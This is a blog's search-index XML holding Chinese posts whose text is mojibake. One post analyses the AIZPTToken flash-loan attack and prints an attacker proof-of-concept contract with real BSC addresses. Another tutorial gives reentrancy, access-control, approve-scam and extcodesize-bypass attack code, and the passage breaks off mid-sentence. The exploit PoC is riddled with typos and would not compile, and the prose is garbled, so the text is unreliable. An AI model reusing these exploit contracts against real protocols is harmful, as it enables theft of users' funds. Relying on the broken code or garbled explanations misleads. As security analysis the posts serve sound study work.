<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-Creativity</title>
      <link href="/2024/10/14/CTF-Creativity/"/>
      <url>/2024/10/14/CTF-Creativity/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20241005AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ</title>
      <link href="/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ"><a href="#AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ" class="headerlink" title="AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ"></a>AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ</h2><p>å…ˆå¤§æ¦‚æè¿°ä¸€ä¸‹ï¼šæ”»å‡»è€…ä½¿ç”¨é—ªç”µè´·å€Ÿçš„é’±ï¼Œç„¶åå†è´­ä¹°äº†ä»·å€¼8000 BNBçš„AIPTToken,ç„¶åå†ä»¥é«˜ä»·å–å‡ºï¼Œä»ä¸­å¾—åˆ°åˆ©æ¶¦ï¼Œè¿˜æ¸…å€Ÿæ¬¾ï¼Œæœ€ç»ˆè·å¾—ä»·å€¼34BNBï¼ˆçº¦ä¿©ä¸‡ç¾é‡‘ï¼‰ã€‚</p><p>è¿™æ˜¯å‘ç”Ÿåœ¨æœ€è¿‘çš„æ”»å‡»ï¼Œé¦–å…ˆæ”»å‡»è€…å‘ç°äº†è¿™ä¸ªAIZPTTokenä»£å¸ä¹°å–çš„è®¡ç®—é”™è¯¯ï¼Œä¸‹é¢æ˜¯æˆªå–çš„AIZPTTokenåˆçº¦ä¸­çš„ä¸€æ®µä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buy() internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swapValue = msg.value;</span><br><span class="line"></span><br><span class="line">   uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">   require(token_amount &gt; 0, &#x27;Buy amount too low&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 user_amount = token_amount * 50 / 100;</span><br><span class="line">   uint256 fee_amount = token_amount - user_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(address(this), msg.sender, user_amount);</span><br><span class="line">   _transfer(address(this), feeReceiver, fee_amount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, swapValue, 0, 0, user_amount);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function sell(uint256 sell_amount) internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br><span class="line"></span><br><span class="line">   require(ethAmount &gt; 0, &#x27;Sell amount too low&#x27;);</span><br><span class="line">   require(address(this).balance &gt;= ethAmount, &#x27;Insufficient ETH in reserves&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swap_amount = sell_amount * 50 / 100;</span><br><span class="line">   uint256 burn_amount = sell_amount - swap_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(msg.sender, address(this), swap_amount);</span><br><span class="line">   _transfer(msg.sender, address(0), burn_amount);</span><br><span class="line"></span><br><span class="line">   payable(msg.sender).transfer(ethAmount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> receive() external payable &#123;</span><br><span class="line">   buy();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢ï¼Œå¯ä»¥å‘ç°ï¼Œç”¨å°‘é‡çš„BNBè´­ä¹°AIZPTToken,å°±å¯ä»¥ä»¥é«˜ä»·å‡ºå”®ï¼Œå…·ä½“å¯ä»¥å¯¹æ¯”ä¿©æ®µä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæ˜¯ä¹°AIPTToken,å¦‚æœä»¥20çš„ä»·é’±è´­ä¹°12ä¸ªä»£å¸ï¼Œç„¶åæˆ‘ä»¬å‡ºå”®ä»£å¸çš„æ—¶å€™ï¼Œä»¥åŒæ ·çš„ä»·æ ¼å‡ºå”®ï¼Œé‚£ä¹ˆä»£å¸çš„æ•°é‡æ˜¯ä¸ç­‰äº12çš„ï¼Œæ¢ç§æ–¹æ³•æ¥è¯´ï¼Œå°±æ˜¯å¯ä»¥ä»¥é«˜ä»·å‡ºå”®ç›¸åŒä»£å¸çš„æ•°é‡</p><p>ä¸‹é¢æ˜¯æ”»å‡»è€…çš„æ”»å‡»çš„æµ‹è¯•åˆçº¦</p><pre><code>//SPDX-License-Identifier: MITpragma solidity ^0.8.13;import &quot;forge-std/Test.sol&quot;import &quot;../interface.sol&quot;address constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;address constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;address constant AIZPT = 0xBe779D420b7D573C08EEe226B9958737b6218888;contract AIZPTTokentest is Test &#123;    address attracker = makeAddr(&quot;attracker&quot;);    function setUp() public&#123;        vm.creatPrankFork(&quot;bsc&quot;,42846998 - 1);    &#125;    function testPOC() public&#123;          vm.startPrank(attracker);          Attracker attracker = new Attrceker();          vm.label(address(attracker),&quot;attracek&quot;) ;          attracker.attrack();          console.log(&quot;&quot;)     &#125;&#125;interface IFS is IERC20&#123;    function flash(address recipient,uint256 amount0,uint256 amount1,bytes caaldata data) external;    function withdraw (uint256) external;    function deposit() exteranl paybale;&#125;contract Attracker&#123;    function attrack() external&#123;      IFS(Pancakev3Pool).flash(address(this),0,8000ehter,&quot;&quot;);            //å°†æ”»å‡»åˆçº¦ä¸­å‰©ä¸‹çš„é’±è½¬ç»™æ”»å‡»è€…è‡ªå·±çš„åœ°å€        IERC20(weth).transfer(            msg.sender,             IERC20(weth).balanceOf(address(this))        );    &#125;     function pancakeV3FlashCallback(        uint256 fee0,        uint256 fee1,        bytes calldata data    ) external &#123;        IFS(weth).withdraw(8000 ether);             AIZPT.call&#123;value: 8000 ether&#125;(&quot;&quot;);        //å‡ºå”®200æ¬¡        for (uint256 i; i &lt; 199; ++i) &#123;          //ä»¥383727 etherçš„ä»·æ ¼å–å‡ºä»£å¸            IERC20(AIZPT).transfer(AIZPT, 3837275 ether);        &#125;        IFS(weth).deposit&#123;value: address(this).balance&#125;();         // è¿˜æ¸…è´·æ¬¾å’Œåˆ©æ¯        IERC20(weth).transfer(PancakeV3Pool, 8004100000000000000000);    &#125;    receive() external payable&#123;&#125;&#125;ä»æµ‹è¯•åˆçº¦ä¸­æ¥çœ‹,å°±æ˜¯åœ¨æ‰§è¡Œé—ªç”µè´·å›è°ƒçš„æ—¶å€™,è¿›è¡Œä¸€ä¸ªè´­ä¹°å‡ºå”®çš„æ“ä½œå®Œæ•´çš„è°ƒç”¨ä¿¡æ¯[ç‚¹å‡»](https://app.blocksec.com/explorer/tx/bsc/0x5e694707337cca979d18f9e45f40e81d6ca341ed342f1377f563e779a746460d?line=998&amp;debugLine=998)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ™ºèƒ½åˆçº¦çš„æ¼æ´</title>
      <link href="/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="æ™ºèƒ½åˆçº¦çš„æ¼æ´"><a href="#æ™ºèƒ½åˆçº¦çš„æ¼æ´" class="headerlink" title="æ™ºèƒ½åˆçº¦çš„æ¼æ´"></a>æ™ºèƒ½åˆçº¦çš„æ¼æ´</h1><h2 id="é‡å…¥æ”»å‡»"><a href="#é‡å…¥æ”»å‡»" class="headerlink" title="é‡å…¥æ”»å‡»"></a>é‡å…¥æ”»å‡»</h2><p> é‡å…¥æ¼æ´æœ¬è´¨ä¸Šæ˜¯çŠ¶æ€åŒæ­¥é—®é¢˜ï¼Œå½“æ™ºèƒ½åˆçº¦è°ƒç”¨å¤–éƒ¨å‡½æ•°æ—¶ï¼Œæ‰§è¡Œæµä¼šè½¬ç§»åˆ°è¢«è°ƒç”¨çš„åˆçº¦ï¼Œå¦‚æœè°ƒç”¨åˆçº¦æœªèƒ½æ­£ç¡®åŒæ­¥çŠ¶æ€ï¼Œåˆ™åœ¨æµç¨‹è½¬ç§»è¿‡ç¨‹ä¸­å¯èƒ½ä¼šè¢«é‡æ–°è¿›å…¥ï¼Œå¯¼è‡´é‡å¤æ‰§è¡Œç›¸åŒçš„ä»£ç é€»è¾‘ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»é€šå¸¸åˆ†ä¸¤ä¸ªæ­¥éª¤å±•å¼€ï¼š<br>1ï¼Œè¢«æ”»å‡»åˆçº¦è°ƒç”¨æ”»å‡»åˆçº¦çš„å¤–éƒ¨å‡½æ•°ï¼Œå¹¶è½¬ç§»æ‰§è¡Œæµç¨‹ã€‚<br>2ï¼Œåœ¨æ”»å‡»åˆçº¦å‡½æ•°å†…éƒ¨ï¼Œåˆ©ç”¨ä¸€å®šçš„æŠ€å·§ï¼Œå†æ¬¡è°ƒç”¨è¢«æ”»å‡»åˆçº¦çš„æ¼æ´å‡½æ•°ã€‚<br>ç”±äºä»¥å¤ªåŠè™šæ‹Ÿæœº (EVM) æ˜¯å•çº¿ç¨‹çš„ï¼Œå› æ­¤åœ¨é‡æ–°è¿›å…¥æ˜“å—æ”»å‡»çš„å‡½æ•°æ—¶ï¼Œåˆçº¦çŠ¶æ€ä¸ä¼šæ­£ç¡®æ›´æ–°ï¼Œç±»ä¼¼äºåˆå§‹è°ƒç”¨ã€‚è¿™å…è®¸æ”»å‡»è€…é‡å¤æ‰§è¡ŒæŸäº›ä»£ç é€»è¾‘ï¼Œä»è€Œå®ç°æ„å¤–è¡Œä¸ºã€‚å…¸å‹çš„æ”»å‡»æ¨¡å¼æ¶‰åŠå¤šæ¬¡é‡å¤çš„èµ„é‡‘æå–ã€‚</p><h3 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><p>ä»¥ä¿®æ”¹åçš„WETHä¸ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 bal = balances[msg.sender];</span><br><span class="line">        require(bal &gt; 0);</span><br><span class="line"></span><br><span class="line">        (bool sent,) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>åœ¨<strong>å­˜æ¬¾å‡½æ•°</strong>ä¸­ï¼Œç”¨æˆ·å¯ä»¥å­˜å…¥ETHï¼Œæ”¶åˆ°çš„WETHè®°å½•åœ¨<strong>ä½™é¢</strong>çŠ¶æ€å˜é‡ä¸­ã€‚</li><li>åœ¨<strong>withdrawå‡½æ•°</strong>ä¸­ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è°ƒç”¨ call å‡½æ•°æ¥æå– ETHï¼Œ<strong>call</strong>å‡½æ•°ç”¨äºå‘ç”¨æˆ·è½¬è´¦ã€‚æ­¤æ—¶ï¼Œæ‰§è¡Œæµç¨‹è½¬ç§»åˆ°ç”¨æˆ·çš„åˆçº¦ã€‚å¦‚æœç”¨æˆ·åˆçº¦æ˜¯æ¶æ„çš„ï¼Œå®ƒå¯ä»¥é€šè¿‡é»˜è®¤çš„<strong>acceptå‡½æ•°é‡æ–°è¿›å…¥withdrawå‡½æ•°</strong>ã€‚ç”±äºä½™é¢æ²¡æœ‰æ›´æ–°ï¼Œ<strong>require</strong>è¯­å¥é€šè¿‡äº†æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ”»å‡»åˆçº¦é‡å¤æå– ETHã€‚</li></ul><p>æ”»å‡»è€…å°±å¯ä»¥éƒ¨ç½²ä¸€ä¸ªåä¸ºAttackçš„æ¶æ„åˆçº¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    EtherStore public etherStore;</span><br><span class="line">    uint256 public constant AMOUNT = 1 ether;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // receive is called when EtherStore sends Ether to this contract.</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= AMOUNT) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= AMOUNT);</span><br><span class="line">        etherStore.deposit&#123;value: AMOUNT&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>åœ¨<strong>æ”»å‡»å‡½æ•°</strong>ä¸­ï¼Œæ”»å‡»è€…é¦–å…ˆè½¬å…¥ä¸€å®šæ•°é‡çš„ETHï¼Œè°ƒç”¨<strong>etherStore.deposit</strong>å‡½æ•°å°†å…¶è½¬å…¥ç›®æ ‡åˆçº¦<strong>EtherStore</strong> ï¼Œç„¶åè°ƒç”¨<strong>etherStore.withdraw</strong>å‡½æ•°æç°ETHã€‚è¿™çœ‹ä¼¼æ˜¯ä¸€ä¸ªå¸¸è§„æ“ä½œï¼Œä½†é—®é¢˜å°±å‡ºç°åœ¨ä¸‹ä¸€ä¸ªå‡½æ•°ä¸­ã€‚</li><li>åˆçº¦æ”¶åˆ° ETH æ—¶é»˜è®¤æ‰§è¡Œçš„å‡½æ•°æ˜¯<strong>accept</strong>ï¼Œå®ƒæ ‡æœ‰<strong>payable</strong>å…³é”®å­—ï¼Œè¡¨ç¤ºå®ƒå¯ä»¥æ¥æ”¶å‘é€ç»™å®ƒçš„ ETHï¼ˆä½¿ç”¨<strong>fallback</strong>å‡½æ•°å¯ä»¥å®ç°ç±»ä¼¼çš„æ•ˆæœï¼‰ã€‚åœ¨å‡½æ•°å†…éƒ¨ï¼Œå¦‚æœç›®æ ‡åˆçº¦çš„ä½™é¢æ»¡è¶³æ¡ä»¶ï¼ˆå¤§äº 1 ETHï¼‰ï¼Œåˆ™å†æ¬¡è°ƒç”¨<strong>withdraw</strong>å‡½æ•°ï¼Œè§¦å‘é‡æ–°è¿›å…¥ã€‚ç”±äºç›®æ ‡åˆçº¦ä¸­ç”¨æˆ·ä½™é¢åªåœ¨æœ€åä¸€æ­¥æ›´æ–°ï¼Œå› æ­¤æ¡ä»¶<strong>require(bal &gt; 0)</strong>;ä»ç„¶æˆç«‹ï¼Œå…è®¸æ”»å‡»è€…ç»§ç»­ä»ç›®æ ‡åˆçº¦ä¸­æŠ½å– ETH ğŸ˜¨ğŸ˜¨ğŸ˜¨</li></ul><h2 id="è®¿é—®æ§åˆ¶æ¼æ´"><a href="#è®¿é—®æ§åˆ¶æ¼æ´" class="headerlink" title="è®¿é—®æ§åˆ¶æ¼æ´"></a>è®¿é—®æ§åˆ¶æ¼æ´</h2><h3 id="ä¸å—é™åˆ¶çš„åˆå§‹åŒ–å‡½æ•°"><a href="#ä¸å—é™åˆ¶çš„åˆå§‹åŒ–å‡½æ•°" class="headerlink" title="ä¸å—é™åˆ¶çš„åˆå§‹åŒ–å‡½æ•°"></a>ä¸å—é™åˆ¶çš„åˆå§‹åŒ–å‡½æ•°</h3><p>æŸäº›åˆçº¦åŒ…å«ç”¨äºè®¾ç½®æ‰€æœ‰è€…çš„åˆå§‹åŒ–å‡½æ•°ï¼Œä½†æœªèƒ½é™åˆ¶è¯¥å‡½æ•°åªèƒ½è°ƒç”¨ä¸€æ¬¡ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå†æ¬¡è°ƒç”¨åˆå§‹åŒ–å‡½æ•°ï¼Œå°†æ‰€æœ‰æƒè½¬ç§»åˆ°ä»–ä»¬çš„è´¦æˆ·ä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function initContract() public &#123;</span><br><span class="line">    owner = msg.sender; // Lack of calling restriction</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿‡åº¦æˆæƒçš„è§’è‰²"><a href="#è¿‡åº¦æˆæƒçš„è§’è‰²" class="headerlink" title="è¿‡åº¦æˆæƒçš„è§’è‰²"></a>è¿‡åº¦æˆæƒçš„è§’è‰²</h3><p>ä½¿ç”¨ OpenZeppelin çš„Ownableåº“æ—¶ï¼Œå¦‚æœå¤šä¸ªè§’è‰²è¢«åˆ†é…onlyOwneræƒé™ï¼Œåˆ™ä¼šå¢åŠ æ”»å‡»é¢ã€‚ä¸€æ—¦æ”»å‡»è€…è·å¾—å…·æœ‰æ‰€æœ‰è€…æƒé™çš„å¸æˆ·çš„è®¿é—®æƒé™ï¼Œä»–ä»¬å°±å¯ä»¥æ‰§è¡Œåˆçº¦ä¸­çš„ä»»ä½•å…³é”®åŠŸèƒ½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function criticalFunction() public onlyOwner &#123;</span><br><span class="line">    // Critical logic</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»£å¸é”€æ¯å‡½æ•°æˆæƒä¸å½“"><a href="#ä»£å¸é”€æ¯å‡½æ•°æˆæƒä¸å½“" class="headerlink" title="ä»£å¸é”€æ¯å‡½æ•°æˆæƒä¸å½“"></a>ä»£å¸é”€æ¯å‡½æ•°æˆæƒä¸å½“</h3><p>å¦‚æœä»£å¸åˆçº¦ä¸­çš„é”€æ¯å‡½æ•°æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨å®ƒæ¥é”€æ¯åˆ«äººçš„ä»£å¸ï¼Œä»è€Œæ“çºµä»£å¸ä¾›åº”ï¼Œå¯¼è‡´ä»·æ ¼æ³¢åŠ¨å’ŒæµåŠ¨æ€§æ¯ç«­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address account, uint256 amount) public &#123;</span><br><span class="line">    _burn(account, amount); // No access control</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20æ‰¹å‡†éª—å±€"><a href="#ERC20æ‰¹å‡†éª—å±€" class="headerlink" title="ERC20æ‰¹å‡†éª—å±€"></a>ERC20æ‰¹å‡†éª—å±€</h2><p>åœ¨åŒºå—é“¾ä¸–ç•Œä¸­ï¼Œä»¥å¤ªåŠçš„ERC20ä»£å¸æ ‡å‡†æ˜¯æœ€çŸ¥åçš„ä»£å¸åè®®æ ‡å‡†ä¹‹ä¸€ã€‚ç„¶è€Œåœ¨ERC20æ ‡å‡†å®æ–½è¿‡ç¨‹ä¸­ï¼Œå¯¹approveå‡½æ•°çš„æ»¥ç”¨ä¼šå¯¼è‡´ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ApproveScam ã€‚æ¥ä¸‹æ¥å°†å¯¹ApproveScamæ¼æ´çš„åŸç†ã€åæœä»¥åŠç›¸åº”çš„é¢„é˜²æªæ–½è¿›è¡Œæ¢è®¨ã€‚</p><h3 id="ApproveScanæ¼æ´æ˜¯ä»€ä¹ˆ"><a href="#ApproveScanæ¼æ´æ˜¯ä»€ä¹ˆ" class="headerlink" title="ApproveScanæ¼æ´æ˜¯ä»€ä¹ˆ"></a>ApproveScanæ¼æ´æ˜¯ä»€ä¹ˆ</h3><p>ApproveScam æ¼æ´æºäºå¯¹ERC20 æ ‡å‡†ä¸­<strong>æ‰¹å‡†å‡½æ•°çš„æ»¥ç”¨</strong>ã€‚<strong>æ‰¹å‡†</strong>å‡½æ•°æ—¨åœ¨å…è®¸ä»£å¸æŒæœ‰è€…æˆæƒç‰¹å®šåœ°å€ä»æŒæœ‰è€…çš„è´¦æˆ·ä¸­è½¬å‡ºä¸€å®šæ•°é‡çš„ä»£å¸ã€‚ä½†æ˜¯ï¼Œå¦‚æœæŒæœ‰è€…æ‰¹å‡†çš„é‡‘é¢è¿‡å¤§ï¼ˆé€šå¸¸æ˜¯<strong>type(uint256).max</strong>è¡¨ç¤ºçš„æ— é™é‡‘é¢ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœªç»æŒæœ‰è€…åŒæ„çš„æƒ…å†µä¸‹ä»æŒæœ‰è€…çš„è´¦æˆ·ä¸­è½¬å‡ºæ‰€æœ‰ä»£å¸ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œä¸€æ—¦ Alice æˆæƒ Eve ä» Alice çš„è´¦æˆ·ä¸­è½¬å‡ºæ— é™é‡çš„ä»£å¸ï¼ŒEve å°±å¯ä»¥è°ƒç”¨transferFromå‡½æ•°å°† Alice è´¦æˆ·ä¸­çš„æ‰€æœ‰ä»£å¸è½¬ç§»åˆ°è‡ªå·±çš„è´¦æˆ·ä¸­ã€‚è¿™å°±æ˜¯ ApproveScam æ¼æ´çš„æ ¸å¿ƒåŸç†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Alice approves Eve to transfer an unlimited amount of tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.approve(address(eve), type(uint256).max);</span><br><span class="line"></span><br><span class="line">// Eve uses the authorization to transfer all tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.transferFrom(address(alice), address(eve), 1000);</span><br></pre></td></tr></table></figure><h3 id="ApproveScançš„åæœ"><a href="#ApproveScançš„åæœ" class="headerlink" title="ApproveScançš„åæœ"></a>ApproveScançš„åæœ</h3><p>ApproveScam æ¼æ´èƒŒåçš„åŸç†è™½ç„¶ç®€å•ï¼Œä½†é€ æˆçš„æŸå¤±å´æ˜¯ç¾éš¾æ€§çš„ã€‚ä¸€æ—¦ç”¨æˆ·è½»æ˜“æˆæƒæŸä¸ªåœ°å€ï¼Œæ”»å‡»è€…ä¾¿å¯ä»¥åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œè½»æ¾å°†ç”¨æˆ·è´¦æˆ·ä¸­çš„æ‰€æœ‰ä»£å¸è½¬èµ°ã€‚</p><p>æ­¤å¤–ï¼ŒApproveScam æ¼æ´è¿˜å¯èƒ½è¢«æ»¥ç”¨äºæ´—é’±ç­‰å…¶ä»–éæ³•æ´»åŠ¨ã€‚æ€»è€Œè¨€ä¹‹ï¼ŒApproveScam æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨é£é™©ï¼Œå¼€å‘äººå‘˜å’Œç”¨æˆ·éœ€è¦è®¤çœŸå¯¹å¾…ã€‚</p><h3 id="å¦‚ä½•é¢„é˜²ApproveScan"><a href="#å¦‚ä½•é¢„é˜²ApproveScan" class="headerlink" title="å¦‚ä½•é¢„é˜²ApproveScan"></a>å¦‚ä½•é¢„é˜²ApproveScan</h3><p>é¢„é˜² ApproveScam æ¼æ´çš„æœ€ä½³æ–¹æ³•æ˜¯è°¨æ…ä½¿ç”¨æ‰¹å‡†åŠŸèƒ½ï¼Œå°¤å…¶æ˜¯åœ¨æˆæƒé‡‘é¢æ—¶ã€‚è¯·éµå¾ªä»¥ä¸‹åŸåˆ™ï¼š</p><ul><li>ä»…åœ¨å¿…è¦æ—¶è°ƒç”¨æ‰¹å‡†åŠŸèƒ½ï¼Œé¿å…è¿‡åº¦ä½¿ç”¨æˆ–æ»¥ç”¨ã€‚</li><li>æ ¹æ®å®é™…éœ€è¦è®¾ç½®æˆæƒé‡‘é¢ï¼Œä¾‹å¦‚permit(spender, amount)è€Œä¸æ˜¯permit(spender, type(uint256).max) ã€‚</li><li>å®ŒæˆåŠŸèƒ½åç«‹å³æ’¤é”€ä¹‹å‰çš„æˆæƒï¼Œå³approve(spender, 0) ã€‚</li><li>åœ¨æ™ºèƒ½åˆçº¦å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå½»åº•æ£€æŸ¥æ‰¹å‡†åŠŸèƒ½çš„ä½¿ç”¨ï¼Œä»¥é˜²æ­¢ ApproveScam æ¼æ´ã€‚</li></ul><h2 id="åˆçº¦è´¦æˆ·æ£€æŸ¥æ¼æ´"><a href="#åˆçº¦è´¦æˆ·æ£€æŸ¥æ¼æ´" class="headerlink" title="åˆçº¦è´¦æˆ·æ£€æŸ¥æ¼æ´"></a>åˆçº¦è´¦æˆ·æ£€æŸ¥æ¼æ´</h2><p>åœ¨ Solidity æ™ºèƒ½åˆçº¦å¼€å‘ä¸­ï¼Œå¼€å‘è€…ç»å¸¸ä¼šä½¿ç”¨å„ç§æ£€æŸ¥æœºåˆ¶æ¥ä¿è¯åˆçº¦çš„å®‰å…¨ã€‚ä¸€ç§å¸¸è§çš„åšæ³•æ˜¯ä½¿ç”¨<strong>extcodesizeå‡½æ•°</strong>æ¥æ£€æŸ¥è°ƒç”¨è€…åœ°å€çš„ä»£ç å¤§å°ï¼Œä»è€ŒåŒºåˆ†åˆçº¦è´¦æˆ·å’Œå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼ˆEOAï¼‰ã€‚ç„¶è€Œï¼Œå¦‚æœæ»¥ç”¨è¯¥æœºåˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨åˆçº¦æ„é€ å‡½æ•°ä¸­çš„ä¸´æ—¶æ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå‘èµ·æ¶æ„æ“ä½œã€‚</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ™ºèƒ½åˆçº¦åœ¨åˆæ¬¡éƒ¨ç½²æ—¶ï¼Œä¼šå…ˆæ‰§è¡Œæ„é€ å‡½æ•°ä»£ç ï¼Œåœ¨æ„é€ å‡½æ•°æ‰§è¡Œå®Œæˆä¹‹å‰ï¼Œæ–°éƒ¨ç½²çš„åˆçº¦åœ°å€ä¸Šå…¶å®æ˜¯æ²¡æœ‰ä»»ä½•å­—èŠ‚ç å­˜åœ¨çš„ï¼Œè¿™å°±å¯¼è‡´äº†åŸºäº extcodesize çš„æ£€æŸ¥å­˜åœ¨ä¸€ä¸ªç›²ç‚¹ï¼šå¦‚æœæ”»å‡»è€…åœ¨æ„é€ å‡½æ•°å†…ç«‹åˆ»è°ƒç”¨ç›®æ ‡åˆçº¦ï¼Œç”±äºæ”»å‡»è€…åˆçº¦åœ°å€ä¸Šçš„å­—èŠ‚ç è¿˜æœªå­˜å‚¨ï¼Œå› æ­¤<strong>extcodesize(address(this))ä¼š</strong>è¿”å› 0ï¼Œä»è€Œç»•è¿‡isContract çš„æ£€æŸ¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        // At this point, extcodesize(address(this)) == 0</span><br><span class="line">        // Bypass the isContract check of the target contract</span><br><span class="line">        Target(_target).isContract(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç æ¼”ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„æ”»å‡»åœºæ™¯ï¼ŒAttackåˆçº¦åœ¨æ„é€ æ—¶ä¼ å…¥Targetåˆçº¦åœ°å€ï¼Œå¹¶ç«‹å³åœ¨æ„é€ å‡½æ•°å†…è°ƒç”¨Target.isContract()å‡½æ•°ã€‚ç”±äºAttackçš„éƒ¨ç½²å°šæœªå®Œæˆï¼ŒisContract(address(this))å°†è¿”å› 